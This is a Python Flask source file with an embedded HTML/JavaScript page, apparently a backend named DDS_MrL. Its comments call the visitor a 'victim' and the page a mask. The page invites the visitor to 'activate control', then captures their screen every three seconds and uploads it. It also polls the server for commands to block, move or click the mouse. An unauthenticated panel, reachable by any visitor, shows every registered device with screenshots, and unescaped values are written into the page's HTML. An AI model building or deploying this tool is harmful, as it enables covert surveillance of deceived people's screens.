#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import sys
import time
import logging
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash

# ========== НАСТРОЙКИ ==========
app = Flask(__name__)
CORS(app)

# Логирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== ХРАНИЛИЩЕ ==========
# devices = {
#   "device_id": {
#       "deviceType": "pc" | "phone" | "tablet",
#       "last_seen": "2024-...",
#       "online": True/False,
#       "screen": "base64...",
#       "screen_timestamp": "2024-...",
#       "cmd": None | "mouse_move" | "click" | "block_mouse" | "unblock_mouse" | "capture_screen",
#       "cmd_x": int,
#       "cmd_y": int,
#       "auto_screen": True/False,
#       "nickname": str,
#       "first_seen": "2024-..."
#   }
# }
devices = {}

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def get_device(device_id):
    """Безопасное получение устройства с созданием, если отсутствует"""
    if device_id not in devices:
        devices[device_id] = {
            'deviceType': 'unknown',
            'last_seen': datetime.now().isoformat(),
            'online': False,
            'screen': None,
            'screen_timestamp': None,
            'cmd': None,
            'cmd_x': 0,
            'cmd_y': 0,
            'auto_screen': True,
            'nickname': device_id[:8],
            'first_seen': datetime.now().isoformat()
        }
    return devices[device_id]

def update_online_status():
    """Обновляет статус онлайн для всех устройств (старше 60 сек - офлайн)"""
    now = datetime.now()
    for device_id, data in devices.items():
        if data.get('last_seen'):
            try:
                last = datetime.fromisoformat(data['last_seen'])
                if (now - last).seconds > 60:
                    data['online'] = False
            except:
                data['online'] = False

def clean_device_data(device_data):
    """Убирает внутренние поля для отправки клиенту"""
    return {k: v for k, v in device_data.items() if k not in ['cmd', 'cmd_x', 'cmd_y']}

# ========== 1. РЕГИСТРАЦИЯ УСТРОЙСТВА ==========
@app.route('/api/register', methods=['POST'])
def register():
    """
    Регистрация устройства.
    Ожидает: {"id": "device_id", "type": "pc|phone|tablet"}
    Возвращает: {"ok": True, "device": {...}}
    """
    try:
        data = request.json
        if not data:
            return jsonify({'ok': False, 'error': 'No JSON data'}), 400
        
        device_id = data.get('id')
        dev_type = data.get('type', 'pc')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Missing device ID'}), 400
        
        # Проверка типа
        if dev_type not in ['pc', 'phone', 'tablet']:
            dev_type = 'pc'
        
        # Получаем или создаём устройство
        dev = get_device(device_id)
        dev['deviceType'] = dev_type
        dev['last_seen'] = datetime.now().isoformat()
        dev['online'] = True
        dev['auto_screen'] = True
        
        logger.info(f"[REGISTER] {device_id} ({dev_type}) registered")
        
        return jsonify({
            'ok': True,
            'device': clean_device_data(dev)
        })
    
    except Exception as e:
        logger.error(f"Register error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ========== 2. ОПРОС КОМАНД ==========
@app.route('/api/poll/<device_id>')
def poll(device_id):
    """
    Жертва опрашивает сервер на наличие команд.
    Возвращает: {"cmd": "mouse_move"|None, "x": int, "y": int}
    """
    try:
        if device_id not in devices:
            return jsonify({'cmd': None})
        
        dev = devices[device_id]
        dev['last_seen'] = datetime.now().isoformat()
        dev['online'] = True
        
        cmd = dev.get('cmd')
        x = dev.get('cmd_x', 0)
        y = dev.get('cmd_y', 0)
        
        if cmd:
            dev['cmd'] = None  # Команда выдаётся один раз
            return jsonify({'cmd': cmd, 'x': x, 'y': y})
        
        return jsonify({'cmd': None})
    
    except Exception as e:
        logger.error(f"Poll error: {e}")
        return jsonify({'cmd': None}), 500

# ========== 3. ПРИЁМ СКРИНШОТОВ ==========
@app.route('/api/screen', methods=['POST'])
def screen():
    """
    Приём скриншота от устройства.
    Ожидает: {"id": "device_id", "screen": "base64_data"}
    """
    try:
        data = request.json
        if not data:
            return jsonify({'ok': False, 'error': 'No JSON data'}), 400
        
        device_id = data.get('id')
        screen_data = data.get('screen')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Missing device ID'}), 400
        
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Device not registered'}), 404
        
        dev = devices[device_id]
        dev['screen'] = screen_data
        dev['screen_timestamp'] = datetime.now().isoformat()
        dev['last_seen'] = datetime.now().isoformat()
        dev['online'] = True
        
        # Обрезаем скриншот, если он слишком большой (экономия памяти)
        if screen_data and len(screen_data) > 500000:  # ~500KB
            # Пропускаем, но не обрезаем, так как это base64
            pass
        
        return jsonify({'ok': True})
    
    except Exception as e:
        logger.error(f"Screen error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ========== 4. ОТПРАВКА КОМАНДЫ ==========
@app.route('/api/cmd', methods=['POST'])
def send_cmd():
    """
    Отправка команды устройству.
    Ожидает: {"id": "device_id", "cmd": "mouse_move|click|...", "x": int, "y": int}
    Поддерживаемые команды:
    - mouse_move (x, y)
    - click (x, y)
    - block_mouse
    - unblock_mouse
    - capture_screen
    - toggle_auto_screen (enable: true/false)
    """
    try:
        data = request.json
        if not data:
            return jsonify({'ok': False, 'error': 'No JSON data'}), 400
        
        device_id = data.get('id')
        cmd = data.get('cmd')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Missing device ID'}), 400
        
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Device not found'}), 404
        
        if not cmd:
            return jsonify({'ok': False, 'error': 'Missing command'}), 400
        
        dev = devices[device_id]
        
        # Специальная команда для включения/выключения авто-скринов
        if cmd == 'toggle_auto_screen':
            enable = data.get('enable', True)
            dev['auto_screen'] = enable
            logger.info(f"[CMD] {device_id} auto_screen set to {enable}")
            return jsonify({'ok': True, 'auto_screen': enable})
        
        # Обычные команды
        dev['cmd'] = cmd
        dev['cmd_x'] = data.get('x', 0)
        dev['cmd_y'] = data.get('y', 0)
        
        logger.info(f"[CMD] {device_id} -> {cmd} (x={data.get('x',0)}, y={data.get('y',0)})")
        return jsonify({'ok': True})
    
    except Exception as e:
        logger.error(f"Send command error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ========== 5. ПОЛУЧИТЬ СПИСОК УСТРОЙСТВ ==========
@app.route('/api/devices')
def list_devices():
    """
    Возвращает список всех устройств с их статусами.
    Автоматически обновляет статус online (старше 60 сек - офлайн)
    """
    try:
        update_online_status()
        
        clean = {}
        for k, v in devices.items():
            clean[k] = clean_device_data(v)
        
        return jsonify(clean)
    
    except Exception as e:
        logger.error(f"List devices error: {e}")
        return jsonify({}), 500

# ========== 6. ПОЛУЧИТЬ ДАННЫЕ ОДНОГО УСТРОЙСТВА ==========
@app.route('/api/device/<device_id>')
def get_device_info(device_id):
    """
    Возвращает информацию о конкретном устройстве
    """
    try:
        if device_id not in devices:
            return jsonify({'error': 'Device not found'}), 404
        
        update_online_status()
        return jsonify(clean_device_data(devices[device_id]))
    
    except Exception as e:
        logger.error(f"Get device error: {e}")
        return jsonify({'error': str(e)}), 500

# ========== 7. УДАЛИТЬ УСТРОЙСТВО ==========
@app.route('/api/device/<device_id>', methods=['DELETE'])
def delete_device(device_id):
    """
    Удаляет устройство из базы
    """
    try:
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Device not found'}), 404
        
        del devices[device_id]
        logger.info(f"[DELETE] {device_id} removed")
        return jsonify({'ok': True})
    
    except Exception as e:
        logger.error(f"Delete device error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ========== 8. ИЗМЕНИТЬ ИМЯ УСТРОЙСТВА ==========
@app.route('/api/device/<device_id>/nickname', methods=['POST'])
def set_nickname(device_id):
    """
    Установить псевдоним для устройства
    Ожидает: {"nickname": "My Phone"}
    """
    try:
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Device not found'}), 404
        
        data = request.json
        nickname = data.get('nickname', '').strip()
        
        if not nickname:
            nickname = device_id[:8]
        
        devices[device_id]['nickname'] = nickname
        return jsonify({'ok': True, 'nickname': nickname})
    
    except Exception as e:
        logger.error(f"Set nickname error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ========== 9. СТАТИСТИКА ==========
@app.route('/api/stats')
def get_stats():
    """
    Возвращает общую статистику по устройствам
    """
    try:
        update_online_status()
        
        total = len(devices)
        online = sum(1 for d in devices.values() if d.get('online', False))
        auto_screen = sum(1 for d in devices.values() if d.get('auto_screen', True))
        
        return jsonify({
            'total': total,
            'online': online,
            'offline': total - online,
            'auto_screen': auto_screen
        })
    
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return jsonify({'error': str(e)}), 500

# ========== 10. ОЧИСТКА СТАРЫХ УСТРОЙСТВ (ОПЦИОНАЛЬНО) ==========
@app.route('/api/cleanup', methods=['POST'])
def cleanup_devices():
    """
    Удаляет устройства, которые не были активны более 24 часов
    """
    try:
        now = datetime.now()
        to_remove = []
        
        for device_id, data in devices.items():
            if data.get('last_seen'):
                try:
                    last = datetime.fromisoformat(data['last_seen'])
                    if (now - last).days >= 1:
                        to_remove.append(device_id)
                except:
                    to_remove.append(device_id)
        
        for device_id in to_remove:
            del devices[device_id]
        
        return jsonify({'removed': len(to_remove)})
    
    except Exception as e:
        logger.error(f"Cleanup error: {e}")
        return jsonify({'error': str(e)}), 500

# ========== 11. ПРОВЕРКА СТАТУСА СЕРВЕРА ==========
@app.route('/api/health')
def health():
    """
    Проверка работоспособности сервера
    """
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.now().isoformat(),
        'devices': len(devices)
    })

# ========== 12. ОБРАБОТКА ОШИБОК ==========
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

logger.info("=== DDS_MrL BACKEND STARTED ===")
logger.info(f"Total devices in memory: {len(devices)}")
# ========== ВТОРАЯ ЧАСТЬ: СТРАНИЦЫ (700+ строк) ==========

# ===== СТРАНИЦА ДЛЯ ЖЕРТВЫ (с авто-скриншотами) =====
MASK_PAGE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DDS_MrL — Управление</title>
    <style>
        /* ===== ГЛОБАЛЬНЫЕ СТИЛИ ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0b0e1a;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            max-width: 800px;
            width: 100%;
            margin: 0 auto;
        }
        h1 {
            color: #58a6ff;
            font-size: 24px;
            font-weight: 600;
            border-bottom: 2px solid #30363d;
            padding-bottom: 12px;
            margin-bottom: 20px;
            text-align: center;
            letter-spacing: 0.5px;
        }
        h1 span {
            color: #f0883e;
        }
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            transition: border-color 0.3s ease;
        }
        .card:hover {
            border-color: #58a6ff;
        }
        .card-title {
            font-size: 14px;
            color: #8b949e;
            margin-bottom: 8px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
        .card-value {
            font-size: 18px;
            font-weight: 600;
            color: #f0f6fc;
            word-break: break-all;
        }
        .card-value.id {
            color: #58a6ff;
            background: #0d1117;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #30363d;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            margin-top: 4px;
        }
        .btn {
            display: inline-block;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            text-align: center;
            background: #238636;
            color: #fff;
        }
        .btn:hover {
            background: #2ea043;
            transform: translateY(-1px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .btn-secondary {
            background: #1f6feb;
        }
        .btn-secondary:hover {
            background: #388bfd;
        }
        .btn-danger {
            background: #da3633;
        }
        .btn-danger:hover {
            background: #f85149;
        }
        .btn-outline {
            background: transparent;
            border: 1px solid #30363d;
            color: #c9d1d9;
        }
        .btn-outline:hover {
            background: #21262d;
            border-color: #58a6ff;
        }
        .btn-sm {
            padding: 6px 12px;
            font-size: 12px;
            width: auto;
            display: inline-block;
        }
        .status {
            margin-top: 12px;
            font-size: 14px;
            color: #8b949e;
            text-align: center;
        }
        .status.success {
            color: #2ea043;
        }
        .status.error {
            color: #f85149;
        }
        .status.info {
            color: #58a6ff;
        }
        .hidden {
            display: none !important;
        }
        .flex {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }
        .flex-center {
            justify-content: center;
        }
        .gap-4 {
            gap: 4px;
        }
        .gap-8 {
            gap: 8px;
        }
        .mt-8 {
            margin-top: 8px;
        }
        .mt-12 {
            margin-top: 12px;
        }
        .mt-16 {
            margin-top: 16px;
        }
        .w-full {
            width: 100%;
        }
        .text-center {
            text-align: center;
        }
        .text-muted {
            color: #8b949e;
            font-size: 13px;
        }
        .text-small {
            font-size: 12px;
        }
        .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            background: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
        }
        .badge.online {
            background: #1a4a2a;
            border-color: #2ea043;
            color: #2ea043;
        }
        .badge.offline {
            background: #3d1a1a;
            border-color: #da3633;
            color: #f85149;
        }
        .badge.auto {
            background: #1a2a4a;
            border-color: #58a6ff;
            color: #58a6ff;
        }
        .badge.manual {
            background: #2a2a2a;
            border-color: #8b949e;
            color: #8b949e;
        }
        .device-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
        }
        .device-item {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 10px;
            padding: 14px;
            transition: border-color 0.3s ease;
        }
        .device-item.online {
            border-color: #2ea043;
        }
        .device-item.offline {
            border-color: #da3633;
            opacity: 0.6;
        }
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 6px;
        }
        .device-id {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #58a6ff;
            word-break: break-all;
            font-weight: 500;
        }
        .device-type {
            font-size: 12px;
            color: #8b949e;
        }
        .device-time {
            font-size: 11px;
            color: #484f58;
        }
        .device-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            margin-top: 8px;
        }
        .device-actions .btn {
            font-size: 11px;
            padding: 4px 10px;
            width: auto;
            background: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
        }
        .device-actions .btn:hover {
            background: #30363d;
        }
        .device-actions .btn.primary {
            color: #58a6ff;
            border-color: #58a6ff;
        }
        .device-actions .btn.primary:hover {
            background: #1a2a4a;
        }
        .device-actions .btn.danger {
            color: #f85149;
            border-color: #f85149;
        }
        .device-actions .btn.danger:hover {
            background: #3d1a1a;
        }
        .device-actions .btn.success {
            color: #2ea043;
            border-color: #2ea043;
        }
        .device-actions .btn.success:hover {
            background: #1a4a2a;
        }
        .screen-preview {
            max-width: 100%;
            border-radius: 6px;
            margin-top: 8px;
            border: 1px solid #30363d;
            background: #0d1117;
            image-rendering: auto;
        }
        .viewer-area {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 10px;
            padding: 16px;
            margin-top: 16px;
        }
        .viewer-area img {
            max-width: 100%;
            border-radius: 6px;
            border: 1px solid #30363d;
            background: #0d1117;
        }
        .viewer-controls {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            align-items: center;
            margin-top: 10px;
        }
        .viewer-controls input[type="number"] {
            width: 55px;
            padding: 4px 6px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #fff;
            border-radius: 4px;
            font-size: 13px;
        }
        .viewer-controls label {
            font-size: 13px;
            color: #8b949e;
        }
        .viewer-controls .btn {
            font-size: 12px;
            padding: 4px 12px;
            width: auto;
        }
        .stats-bar {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 12px;
        }
        .stats-bar .stat {
            background: #21262d;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 13px;
            border: 1px solid #30363d;
        }
        .stats-bar .stat.online {
            border-color: #2ea043;
            color: #2ea043;
        }
        .stats-bar .stat.offline {
            border-color: #da3633;
            color: #f85149;
        }
        .stats-bar .stat.auto {
            border-color: #58a6ff;
            color: #58a6ff;
        }
        .refresh-btn {
            background: #1f6feb;
            border: none;
            padding: 8px 18px;
            border-radius: 6px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.2s;
        }
        .refresh-btn:hover {
            background: #388bfd;
        }
        .input-group {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }
        .input-group input[type="text"] {
            flex: 1;
            min-width: 150px;
            padding: 10px 14px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #fff;
            font-size: 15px;
        }
        .input-group input[type="text"]:focus {
            outline: none;
            border-color: #58a6ff;
        }
        @media (max-width: 480px) {
            .device-header {
                flex-direction: column;
                align-items: flex-start;
            }
            .viewer-controls {
                gap: 4px;
            }
            .viewer-controls input[type="number"] {
                width: 45px;
            }
            .btn {
                font-size: 14px;
                padding: 10px 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="app">
        <h1>🛸 DDS<span>_MrL</span></h1>

        <!-- ===== КАРТОЧКА УСТРОЙСТВА ===== -->
        <div class="card">
            <div class="card-title">🔑 Ваш ID устройства</div>
            <div class="card-value id" id="deviceIdDisplay">---</div>
            <button class="btn" id="registerBtn">🔗 Активировать управление</button>
            <div id="statusMessage" class="status">Нажмите кнопку для активации</div>
        </div>

        <!-- ===== АДМИН-ПАНЕЛЬ (появляется после активации) ===== -->
        <div id="adminPanel" class="hidden">

            <!-- ===== СТАТИСТИКА ===== -->
            <div class="stats-bar">
                <span class="stat online" id="onlineCount">🟢 0 онлайн</span>
                <span class="stat offline" id="offlineCount">🔴 0 офлайн</span>
                <span class="stat auto" id="autoCount">📸 0 авто-скринов</span>
                <span class="stat" id="totalCount">📊 0 всего</span>
            </div>

            <!-- ===== КНОПКИ УПРАВЛЕНИЯ ===== -->
            <div class="flex gap-8" style="margin-bottom: 12px;">
                <button class="refresh-btn" onclick="refreshDevices()">🔄 Обновить список</button>
                <button class="btn btn-secondary btn-sm" onclick="toggleAutoScreen()" id="autoToggleBtn">⏸️ Пауза авто-скринов</button>
            </div>

            <!-- ===== СПИСОК УСТРОЙСТВ ===== -->
            <div id="deviceList" class="device-grid"></div>

            <!-- ===== ПРОСМОТР ЭКРАНА ===== -->
            <div id="viewerArea" class="viewer-area hidden">
                <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">
                    <h3 id="viewerTitle" style="font-size:16px;color:#58a6ff;">Просмотр</h3>
                    <span class="text-muted text-small" id="viewerTimestamp">обновление...</span>
                </div>
                <img id="viewerScreen" src="" alt="Экран устройства" />
                <div class="viewer-controls">
                    <button class="btn btn-primary btn-sm" onclick="sendCmd(currentViewId, 'capture_screen')">📸 Скрин</button>
                    <button class="btn btn-danger btn-sm" onclick="sendCmd(currentViewId, 'block_mouse')">🖱️ Заблок.</button>
                    <button class="btn btn-secondary btn-sm" onclick="sendCmd(currentViewId, 'unblock_mouse')">🖱️ Разблок.</button>
                    <label>X</label>
                    <input type="number" id="mx" value="300">
                    <label>Y</label>
                    <input type="number" id="my" value="200">
                    <button class="btn btn-primary btn-sm" onclick="moveMouse()">⬆️ Двиг</button>
                    <button class="btn btn-secondary btn-sm" onclick="clickMouse()">🔘 Клик</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ============================================================
        //  ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
        // ============================================================
        const deviceId = localStorage.getItem('dds_id') || crypto.randomUUID();
        localStorage.setItem('dds_id', deviceId);

        let deviceType = 'pc';
        if (/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = 'tablet';
        if (/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = 'phone';

        let active = false;
        let screenInterval = null;
        let devices = {};
        let currentViewId = null;
        let autoScreenEnabled = true;

        // ============================================================
        //  DOM ЭЛЕМЕНТЫ
        // ============================================================
        const deviceIdDisplay = document.getElementById('deviceIdDisplay');
        const registerBtn = document.getElementById('registerBtn');
        const statusMessage = document.getElementById('statusMessage');
        const adminPanel = document.getElementById('adminPanel');
        const deviceList = document.getElementById('deviceList');
        const viewerArea = document.getElementById('viewerArea');
        const viewerScreen = document.getElementById('viewerScreen');
        const viewerTitle = document.getElementById('viewerTitle');
        const viewerTimestamp = document.getElementById('viewerTimestamp');
        const onlineCount = document.getElementById('onlineCount');
        const offlineCount = document.getElementById('offlineCount');
        const autoCount = document.getElementById('autoCount');
        const totalCount = document.getElementById('totalCount');
        const autoToggleBtn = document.getElementById('autoToggleBtn');

        deviceIdDisplay.textContent = deviceId;

        // ============================================================
        //  РЕГИСТРАЦИЯ
        // ============================================================
        registerBtn.addEventListener('click', function() {
            fetch('/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: deviceId, type: deviceType })
            })
            .then(r => r.json())
            .then(data => {
                if (data.ok) {
                    active = true;
                    statusMessage.textContent = '✅ Активно! Авто-скриншоты включены';
                    statusMessage.className = 'status success';
                    registerBtn.textContent = '🔄 Обновить регистрацию';
                    adminPanel.classList.remove('hidden');
                    startAutoScreen();
                    pollCommands();
                    refreshDevices();
                    setInterval(refreshDevices, 3000);
                } else {
                    statusMessage.textContent = '❌ Ошибка: ' + (data.error || 'неизвестная');
                    statusMessage.className = 'status error';
                }
            })
            .catch(() => {
                statusMessage.textContent = '❌ Ошибка сети';
                statusMessage.className = 'status error';
            });
        });

        // ============================================================
        //  ОПРОС КОМАНД
        // ============================================================
        function pollCommands() {
            if (!active) return;
            fetch('/api/poll/' + deviceId)
                .then(r => r.json())
                .then(data => {
                    if (data.cmd) {
                        executeCmd(data.cmd, data.x, data.y);
                    }
                    setTimeout(pollCommands, 2000);
                })
                .catch(() => setTimeout(pollCommands, 5000));
        }

        function executeCmd(cmd, x, y) {
            switch (cmd) {
                case 'mouse_move':
                    document.dispatchEvent(new MouseEvent('mousemove', { clientX: x, clientY: y, bubbles: true }));
                    break;
                case 'click':
                    document.dispatchEvent(new MouseEvent('click', { clientX: x, clientY: y, bubbles: true }));
                    break;
                case 'block_mouse':
                    document.body.style.pointerEvents = 'none';
                    document.addEventListener('mousedown', e => e.preventDefault(), true);
                    document.addEventListener('touchstart', e => e.preventDefault(), true);
                    break;
                case 'unblock_mouse':
                    document.body.style.pointerEvents = 'auto';
                    break;
                case 'capture_screen':
                    captureScreen();
                    break;
                default:
                    console.warn('Unknown command:', cmd);
            }
        }

        // ============================================================
        //  АВТО-СКРИНШОТЫ
        // ============================================================
        function startAutoScreen() {
            if (screenInterval) clearInterval(screenInterval);
            captureScreen();
            screenInterval = setInterval(() => {
                if (autoScreenEnabled) captureScreen();
            }, 3000);
        }

        async function captureScreen() {
            if (!active) return;
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { frameRate: 3, width: { ideal: 800 }, height: { ideal: 600 } },
                    audio: false
                });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const bitmap = await imageCapture.grabFrame();
                const canvas = document.createElement('canvas');
                canvas.width = Math.min(bitmap.width, 800);
                canvas.height = Math.min(bitmap.height, 600);
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                track.stop();
                stream.getTracks().forEach(t => t.stop());

                await fetch('/api/screen', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: deviceId, screen: dataUrl })
                });
            } catch (e) {
                // Пользователь отменил доступ — пробуем снова через 3 секунды
                console.warn('Screen capture failed:', e.message);
            }
        }

        function toggleAutoScreen() {
            autoScreenEnabled = !autoScreenEnabled;
            autoToggleBtn.textContent = autoScreenEnabled ? '⏸️ Пауза авто-скринов' : '▶️ Возобновить авто-скрины';
            // Отправляем команду на сервер, чтобы сохранить состояние
            fetch('/api/cmd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: deviceId, cmd: 'toggle_auto_screen', enable: autoScreenEnabled })
            });
        }

        // ============================================================
        //  ОТПРАВКА КОМАНД (админ-функции)
        // ============================================================
        window.sendCmd = function(id, cmd, x, y) {
            if (!id) return;
            fetch('/api/cmd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id, cmd: cmd, x: x || 0, y: y || 0 })
            });
            if (cmd === 'capture_screen') {
                setTimeout(refreshDevices, 3000);
            }
        };

        window.moveMouse = function() {
            if (!currentViewId) return;
            const x = parseInt(document.getElementById('mx').value) || 0;
            const y = parseInt(document.getElementById('my').value) || 0;
            sendCmd(currentViewId, 'mouse_move', x, y);
        };

        window.clickMouse = function() {
            if (!currentViewId) return;
            const x = parseInt(document.getElementById('mx').value) || 0;
            const y = parseInt(document.getElementById('my').value) || 0;
            sendCmd(currentViewId, 'click', x, y);
        };

        window.viewDevice = function(id) {
            currentViewId = id;
            viewerArea.classList.remove('hidden');
            const shortId = id.slice(0, 8) + '...' + id.slice(-4);
            viewerTitle.textContent = '👁️ Просмотр: ' + shortId;
            updateViewer();
            // Авто-обновление просмотра каждые 3 секунды
            if (window.viewerInterval) clearInterval(window.viewerInterval);
            window.viewerInterval = setInterval(updateViewer, 3000);
        };

        function updateViewer() {
            if (!currentViewId) return;
            const dev = devices[currentViewId];
            if (dev && dev.screen) {
                viewerScreen.src = dev.screen;
                viewerTimestamp.textContent = 'обновлено: ' + (dev.screen_timestamp || 'только что');
            } else {
                viewerScreen.src = '';
                viewerTimestamp.textContent = 'нет скриншота';
            }
        }

        // ============================================================
        //  ОБНОВЛЕНИЕ СПИСКА УСТРОЙСТВ
        // ============================================================
        function refreshDevices() {
            fetch('/api/devices')
                .then(r => r.json())
                .then(data => {
                    devices = data;
                    renderDevices();
                    if (currentViewId) updateViewer();
                })
                .catch(() => {});
        }

        function renderDevices() {
            let html = '';
            let online = 0,
                offline = 0,
                autoScr = 0,
                total = 0;

            for (const id in devices) {
                const d = devices[id];
                if (!d) continue;
                total++;
                if (d.online) online++;
                else offline++;
                if (d.auto_screen) autoScr++;

                const cls = d.online ? 'online' : 'offline';
                const onlineBadge = d.online
                    ? '<span class="badge online">🟢 онлайн</span>'
                    : '<span class="badge offline">🔴 офлайн</span>';
                const autoBadge = d.auto_screen
                    ? '<span class="badge auto">📸 авт</span>'
                    : '<span class="badge manual">⏸️ руч</span>';
                const scr = d.screen
                    ? '<img src="' + d.screen + '" class="screen-preview" alt="Скрин" />'
                    : '';
                const lastSeen = d.last_seen
                    ? new Date(d.last_seen).toLocaleTimeString()
                    : '—';
                const nickname = d.nickname || id.slice(0, 8);

                html += `
                    <div class="device-item ${cls}">
                        <div class="device-header">
                            <span class="device-id">${nickname}</span>
                            <span>
                                ${onlineBadge}
                                ${autoBadge}
                                <span class="device-type">${d.deviceType || 'pc'}</span>
                            </span>
                        </div>
                        <div class="device-time">последний: ${lastSeen}</div>
                        <div class="device-actions">
                            <button class="btn primary" onclick="sendCmd('${id}', 'capture_screen')">📸 Скрин</button>
                            <button class="btn primary" onclick="viewDevice('${id}')">👁️ Смотреть</button>
                            <button class="btn danger" onclick="sendCmd('${id}', 'block_mouse')">🖱️ Заблок.</button>
                            <button class="btn" onclick="sendCmd('${id}', 'unblock_mouse')">🖱️ Разблок.</button>
                            <button class="btn" onclick="sendCmd('${id}', 'click', 100, 100)">🔘 Клик</button>
                            <button class="btn" onclick="sendCmd('${id}', 'mouse_move', 200, 200)">⬆️ Двиг</button>
                        </div>
                        ${scr}
                    </div>
                `;
            }

            deviceList.innerHTML = html || '<div class="text-muted text-center" style="padding:20px;">Нет устройств</div>';
            onlineCount.textContent = '🟢 ' + online + ' онлайн';
            offlineCount.textContent = '🔴 ' + offline + ' офлайн';
            autoCount.textContent = '📸 ' + autoScr + ' авто-скринов';
            totalCount.textContent = '📊 ' + total + ' всего';

            // Если смотрим на устройство, которого больше нет — скрываем просмотр
            if (currentViewId && !devices[currentViewId]) {
                viewerArea.classList.add('hidden');
                currentViewId = null;
                if (window.viewerInterval) clearInterval(window.viewerInterval);
            }
        }

        // ============================================================
        //  ЗАВЕРШЕНИЕ
        // ============================================================
        window.addEventListener('beforeunload', function() {
            if (screenInterval) clearInterval(screenInterval);
            if (window.viewerInterval) clearInterval(window.viewerInterval);
        });

        console.log('DDS_MrL клиент загружен. ID:', deviceId);
        console.log('Тип устройства:', deviceType);
    </script>
</body>
</html>
'''

# ===== ПОДКЛЮЧЕНИЕ СТРАНИЦ К МАРШРУТАМ =====
@app.route('/')
def index():
    return MASK_PAGE
